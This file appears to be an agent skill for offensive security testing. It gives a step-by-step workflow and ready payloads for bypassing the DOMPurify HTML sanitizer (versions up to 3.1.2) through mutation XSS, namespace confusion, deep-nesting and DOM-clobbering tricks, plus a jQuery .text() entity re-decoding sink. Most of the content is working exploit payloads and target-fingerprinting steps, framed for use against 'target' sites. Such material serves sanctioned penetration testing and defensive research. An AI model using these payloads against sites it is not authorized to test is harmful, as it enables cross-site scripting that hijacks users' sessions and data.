---
name: dompurify-mxss-bypass
description: Crafts mutation XSS payloads, identifies namespace confusion vectors, and exploits parsing differentials in DOMPurify HTML sanitizer. Use when DOMPurify.sanitize() detected in target JS source (CDN include or npm module).
---

# DOMPurify mXSS Bypass

## Pattern
- `DOMPurify.sanitize()` calls in JavaScript source
- CDN includes: `cdn.jsdelivr.net/npm/dompurify` or `cdnjs.cloudflare.com/ajax/libs/dompurify`
- Sanitized HTML inserted via `.innerHTML` or `.outerHTML`
- Version <=3.1.2 (check JS global `DOMPurify.version`)

## Workflow
1. **Fingerprint version** — check `DOMPurify.version` in browser console or grep JS source for version string in CDN URL / bundled comment
2. **Test namespace confusion** (<=3.1.2) — inject SVG/title payload, check if alert fires
3. **If stripped, check DOM mutation** — inspect browser DevTools Elements panel for DOM structure changes after sanitization (mutation evidence without execution still confirms the vector)
4. **Test node flattening** (<=3.1.2) — generate 506+ nested div payload, append SVG/style
5. **Test DOM clobbering depth reset** (<=3.1.1) — 508+ nested forms with style payload
6. **Grep for post-sanitization sinks** — search for `.text()` / `.val()` / `.textContent` output flowing into `.innerHTML` / `.html()` / `document.write()` downstream of DOMPurify
7. **Test entity re-decoding** — if post-sanitization sink found, inject `&lt;img src=x onerror=alert(document.domain)&gt;`
8. **Confirm execution** — if alert fires, capture version, payload, and DOM context as PoC evidence

## Probe
**Namespace Confusion (<=3.1.2):**
```html
<svg><title><img src=x onerror=alert(1)><caption><caption></caption></caption></title></svg>
```
**Node Flattening (<=3.1.2)** — 506+ nested divs trigger DOM parser mutation:
```html
<div><div>...[506 nested]...</div><svg><style>alert(1)</style></svg></div>
```
**DOM Clobbering Depth Reset (<=3.1.1):**
```html
<form id="parentNode"><form>...[508 nested forms]...</form></form><style>alert(1)</style>
```
## Post-Sanitization Bypass: jQuery .text() Entity Re-decoding

Not an mXSS — a post-sanitization data flow bug where downstream code decodes DOMPurify's safe output back into dangerous HTML:

```javascript
// Vulnerable pattern:
const clean = DOMPurify.sanitize(value);        // entities preserved (safe)
const $el = $('<div>' + clean + '</div>');       // browser decodes entities into DOM text
const text = $el.text();                          // .text() reads decoded content as raw string
el.innerHTML = text;                              // re-parses raw string as HTML → XSS
```

**Payload:** `&lt;img src=x onerror=alert(document.domain)&gt;`

Same applies to `.val()` and `.textContent` reads that feed into innerHTML.

**Detection:** Grep for `.text()` or `.val()` output flowing into `.innerHTML` or `.html()` — especially when DOMPurify sits upstream.

## Indicators
- Payload executes despite DOMPurify presence in source code
- Works only after DOM insertion (string looks safe, DOM isn't)
- Deep nesting or namespace tags succeed when simple XSS payloads fail
- Entity-encoded payloads execute when raw payloads are stripped (jQuery .text() chain)

## Chain With
- unicode-normalization-bypass (Unicode payload variants through sanitizer)
- dom-vulnerability-static-analysis (grep for .text()/.val() → innerHTML patterns)

## Reference
https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
